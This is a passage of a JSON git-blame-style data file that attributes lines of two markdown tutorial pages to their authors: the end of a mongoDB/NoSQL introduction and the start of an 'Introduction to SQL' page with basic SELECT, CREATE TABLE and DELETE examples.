        "lineNumber": 348,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 349,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "## Caveats of NoSQL"
      },
      {
        "lineNumber": 350,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 351,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 352,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 353,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "#### 1. Lack of Standardisation"
      },
      {
        "lineNumber": 354,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "From both a user and implementation standpoint, NoSQL databases vary from one solution to another greatly, which can incur"
      },
      {
        "lineNumber": 355,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "extra development costs in projects when there is a need to migrate to another solution, or when new developers are introduced"
      },
      {
        "lineNumber": 356,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "to the project."
      },
      {
        "lineNumber": 357,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 358,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "This is in stark contrast to relational databases which mainly use \u003ctooltip content\u003d\"Structured Query Language\"\u003eSQL\u003c/tooltip\u003e, having a syntax that is mostly standardised across its different \u003ctooltip content\u003d\"eg. PostgreSQL, MySQL, etc.\"\u003eimplementations.\u003c/tooltip\u003e"
      },
      {
        "lineNumber": 359,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 360,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "#### 2. Not Suited for Complex Relational Queries"
      },
      {
        "lineNumber": 361,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "While NoSQL databases certainly allow for more flexibility in structuring out relations, most complex queries (eg. joins for many-to-many relations) _usually_ involve structured data that can be easily represented in tabular formats. "
      },
      {
        "lineNumber": 362,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 363,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In such instances, queries are often more performant in SQL equivalents."
      },
      {
        "lineNumber": 364,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 365,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 366,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "---"
      },
      {
        "lineNumber": 367,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 368,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "## How to get Started With NoSQL?"
      },
      {
        "lineNumber": 369,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 370,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "There are many NoSQL variants out there as mentioned earlier."
      },
      {
        "lineNumber": 371,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For starters, it may be wise to go with the most common solution, _mongoDB_."
      },
      {
        "lineNumber": 372,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 373,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "**Setup**"
      },
      {
        "lineNumber": 374,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 375,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "You could follow the mongoDB documentation [here](https://docs.mongodb.com/manual/installation/#mongodb-community-edition-installation-tutorials)"
      },
      {
        "lineNumber": 376,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "and learn to set up a local instance of mongoDB."
      },
      {
        "lineNumber": 377,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 378,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Thereafter, you should use a \u003ctrigger trigger\u003d\"click\" for\u003d\"local-shell-advise\"\u003e**local** _mongo shell_\u003c/trigger\u003e to get familiar with mongoDB syntax.\u003cbr\u003e"
      },
      {
        "lineNumber": 379,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "You can follow the instructions [here](https://docs.mongodb.com/manual/mongo/) to connect to your "
      },
      {
        "lineNumber": 380,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "mongoDB instance from the shell as you had configured earlier."
      },
      {
        "lineNumber": 381,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 382,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cpopover header\u003d\"Online playgrounds\" id\u003d\"local-shell-advise\"\u003e"
      },
      {
        "lineNumber": 383,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003ctemplate slot\u003d\"content\"\u003e"
      },
      {
        "lineNumber": 384,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 385,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "There are also many online playgrounds that allow you to experiment with mongoDB queries without setting up a"
      },
      {
        "lineNumber": 386,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "local database instance and shell, such as [this](https://mongoplayground.net/)."
      },
      {
        "lineNumber": 387,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 388,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cdiv\u003e"
      },
      {
        "lineNumber": 389,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "However, to put what you\u0027ve learnt into practice (bulding an application) later, I highly recommend getting your feet wet with the shell and local mongoDB instance first, since it will be necessary to set up your application drivers later on!"
      },
      {
        "lineNumber": 390,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/div\u003e"
      },
      {
        "lineNumber": 391,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/template\u003e"
      },
      {
        "lineNumber": 392,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 393,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 394,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "**Basics**"
      },
      {
        "lineNumber": 395,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 396,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Here are some great resources on mongoDB:"
      },
      {
        "lineNumber": 397,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- [Key Components of MongoDB Architecture](https://www.guru99.com/what-is-mongodb.html) heading here for a quick refresher of key terminology in mongoDB."
      },
      {
        "lineNumber": 398,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- [Data-flair](https://data-flair.training/blogs/mongodb-create-database/) is a great starting point on \u003ctooltip content\u003d\"creating databases, collections, etc.\"\u003eadministration\u003c/tooltip\u003e of"
      },
      {
        "lineNumber": 399,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "your local mongoDB instance. It also provides a higher level overview of each topic than the MongoDB documentation."
      },
      {
        "lineNumber": 400,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- [MongoDB documentation](https://docs.mongodb.com/manual/crud/) can be overwhelming, but it is also"
      },
      {
        "lineNumber": 401,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "a great starting point to learn and test features of mongoDB, and is the defacto reference for it."
      },
      {
        "lineNumber": 402,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 403,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "To guide you through your journey, here are the essentials that you should go through on the above sites _in order_."
      },
      {
        "lineNumber": 404,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 405,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "1. Basic database administration"
      },
      {
        "lineNumber": 406,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "2. CRUD operations"
      },
      {
        "lineNumber": 407,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "3. Data aggregation"
      },
      {
        "lineNumber": 408,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 409,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "**Practice**"
      },
      {
        "lineNumber": 410,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 411,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "After learning these core features and getting familiar with the syntax, you could try your hand at building"
      },
      {
        "lineNumber": 412,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "a simple project to get a good feel for NoSQL in an actual backend."
      },
      {
        "lineNumber": 413,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 414,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Depending on the backend language you are using, you should browse through the documentation [here](https://docs.mongodb.com/ecosystem/drivers/) for the \u003ctrigger for\u003d\"which-driver\"\u003eappropriate language\u003c/trigger\u003e and learn how to connect to your"
      },
      {
        "lineNumber": 415,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "mongoDB instance from your application and utilize the features you learnt above."
      },
      {
        "lineNumber": 416,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 417,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cpopover header\u003d\"Which driver should I try first?\" id\u003d\"which-driver\"\u003e"
      },
      {
        "lineNumber": 418,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003ctemplate slot\u003d\"content\"\u003e"
      },
      {
        "lineNumber": 419,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 420,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- Syntax for the different drivers will inevitably vary slightly from language to language. However, the core concepts stay the same."
      },
      {
        "lineNumber": 421,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- If you want something familiar, and you have knowledge of nodeJS, I highly recommend getting started with the"
      },
      {
        "lineNumber": 422,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "nodeJS driver which is very close to the shell syntax."
      },
      {
        "lineNumber": 423,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "{ .pl-4 }"
      },
      {
        "lineNumber": 424,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 425,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/template\u003e"
      },
      {
        "lineNumber": 426,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 427,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 428,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "**Advanced**"
      },
      {
        "lineNumber": 429,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 430,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "If you\u0027re interested in learning more about mongoDB, I recommend going through some of the following topics in order -"
      },
      {
        "lineNumber": 431,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "_Indexes, Schema validation, Sharding_ (horizontal scaling), _Replica sets_ (redundancy)."
      },
      {
        "lineNumber": 432,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 433,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Otherwise, you could check out some other popular NoSQL databases, which can even be complementary to mongoDB."
      },
      {
        "lineNumber": 434,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- [Redis](https://redis.io/) - An in-memory NoSQL \u003cpopover id\u003d\"key-value-db\" header\u003d\"Key-Value databases\" content\u003d\"A simpler variant of document databases where data is accessed through _keys_ and stored in corresponding _values_, which can be of many formats.\"\u003ekey-value\u003c/popover\u003e database used for caching purposes."
      },
      {
        "lineNumber": 435,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- [Neo4j](https://neo4j.com/) - A NoSQL \u003cpopover id\u003d\"graph-db\" placement\u003d\"top\" header\u003d\"Graph databases\" content\u003d\"Data is represented by a graph in such databases. Values are stored in the graph\u0027s nodes, while relations between these nodes are represented by the edges of the graph.\"\u003egraph database\u003c/popover\u003e."
      },
      {
        "lineNumber": 436,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 437,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "---"
      },
      {
        "lineNumber": 438,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      }
    ],
    "authorContributionMap": {
      "ang-zeyu": 438
    }
  },
  {
    "path": "contents/data/sql/SQL.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to SQL"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to SQL"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author(s): [Amrut Prabhu](https://github.com/amrut-prabhu)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Ronak Lakhotia](https://github.com/RonakLakhotia), [Rahul Rajesh](https://github.com/rrtheonlyone)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is SQL?‎](#what-is-sql)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [How does SQL work?‎](#how-does-sql-work)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why learn SQL?‎](#why-learn-sql)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Disadvantage‎](#disadvantage)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to get started with SQL?‎](#how-to-get-started-with-sql)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "## What is SQL?"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "A Relational Database Management System (RDBMS) is a popular database solution used by software applications to manage their data."
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "**Structured Query Language** (**SQL**) is a programming language that is specifically designed for interacting with an RDBMS. Unlike other languages, SQL doesn\u0027t come as a standalone installation."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "Rather, RDBMSs %%like MySQL, Oracle, SQL Server and PostgreSQL%% come with an _implementation_ of SQL."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### How Does SQL Work?"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "SQL uses **queries** to retrieve data. Here is an example of how an SQL query is used."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose we have the data table `Students` shown here:"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "| ID | Name  | Course | Faculty |"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "| -- | ----- | ------ | ------- |"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "| 1  | Alex  | CS202  | CS      |"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "| 2  | Bob   | MA303  | MA      |"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "| 3  | Cathy | CS202  | CS      |"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "| 4  | Daren | CS202  | CS      |"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "| 5  | Ellie | CS101  | CS      |"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "| 6  | Fred  | MA303  | MA      |"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "| 7  | Gary  | CS101  | CS      |"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "| 8  | Henry | CS404  | CS      |"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "We can use this SQL query to retrieve information from this table:"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "SELECT Course, COUNT(*) num"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "FROM Students"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "WHERE Faculty \u003d \u0027CS\u0027"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "GROUP BY Course"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "HAVING COUNT(*) \u003e 1"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "ORDER BY num;"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "This query first filters the entries in the `Students` table such that only entries that have `CS` as the faculty are considered."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "After that, it groups those entries into the 3 courses: `CS101`, `CS202` and `CS404`."
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "Then, it removes courses that do not have more than 1 student, i.e., `CS404` is removed from consideration."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "Finally, it returns a list of courses with a count of the number of students, ordered in increasing order."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "So, the output of the query is:"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "| Course | num |"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "| ------ | --- |"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "| CS101  | 2   |"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "| CS202  | 3   |"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "You can see how this simple query can prove to be extremely useful for getting this information when the table has a large number of rows. Queries can also be used to retrieve data that span across multiple tables. Apart from retrieving information, SQL can be used for creating, deleting and manipulating data with commands like `INSERT`, `DELETE` and `UPDATE` for entries, in addition to `CREATE`, `DROP` and `ALTER` for tables as a whole."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "For example, you can set up the structure of the table shown in Table 1 by executing the `CREATE TABLE` query shown here."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "It creates a new data table `Students`, with 4 fields (`ID`, `Name`, `Course` and `Faculty`) and specifies their data types."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "CREATE TABLE Students(ID int, Name varchar(255), Course varchar(255), Faculty varchar(255));"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "We can also remove rows containing the `MA` faculty from Table 1 with this `DELETE` query."
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "DELETE"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "FROM Students"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "WHERE Faculty\u003d\u0027MA\u0027;"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "  You can experiment with \u003ca href\u003d\"https://www.db-fiddle.com/f/kHqV2edUGxCc1dU6vE6CmS/1\"\u003ethis example on DB Fiddle\u003c/a\u003e (shown in Figure 1 below) by entering SQL queries and then running them."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"DBFiddle.png\" alt\u003d\"Running queries on DB Fiddle\" width\u003d\"100%\"\u003e  "
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 1. Using DB Fiddle to run queries in MySQL_"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "**Online editors** like DB Fiddle can be used while learning SQL. However, to use SQL in application development, you need to consider other alternatives for running SQL queries:"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "- **RDBMS software**: RDBMS installations usually come with a \u003ctooltip content\u003d\"Graphical User Interface\"\u003eGUI\u003c/tooltip\u003e (see Figure 2), but can also be accessed from the command line (see Figure 3)."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"MySQL_Workbench.png\" alt\u003d\"MySQL Workbench GUI Software\" width\u003d\"100%\"\u003e  "
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 2. MySQL (an RDBMS) can be used in the MySQL Workbench GUI application_ ([source](https://www.mysql.com/products/workbench/))  "
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"MySQL_CLI.png\" alt\u003d\"Running MySQL from the command line\" width\u003d\"75%\"\u003e  "
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 3. Logging in to the MySQL RDBMS and viewing tables from the command line_ ([source](https://www.researchgate.net/figure/The-MySQL-command-line-tool_fig5_328093393))  "
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "- **APIs**: You can use APIs in programming languages or independent ones like [SQL API](https://carto.com/developers/sql-api/) (shown in Figure 4) to interact with databases. For example, the [SQLite3](https://www.pythoncentral.io/introduction-to-sqlite-in-python/) library can be used to interact with a database through Python."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003ccenter\u003e"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003cimg src\u003d\"SQL_API.png\" alt\u003d\"Using SQL API to execute queries\" width\u003d\"95%\"\u003e  "
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "    _Figure 4. An example of how to use CARTO\u0027s SQL API, which uses a PostgreSQL database_ ([source](https://carto.com/developers/sql-api/))  "
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003c/center\u003e"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Learn SQL?"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "The main reason why you should learn SQL is because of its widespread adoption. As SQL is not limited to any particular operating system or programming language, RDBMSs (which use SQL)  are **widely used** by a lot of software applications %%(web, mobile etc.)%%. Hence, in order to utilize almost any relational database or RDBMS available today, you need to know the SQL language."
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "## Disadvantage"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
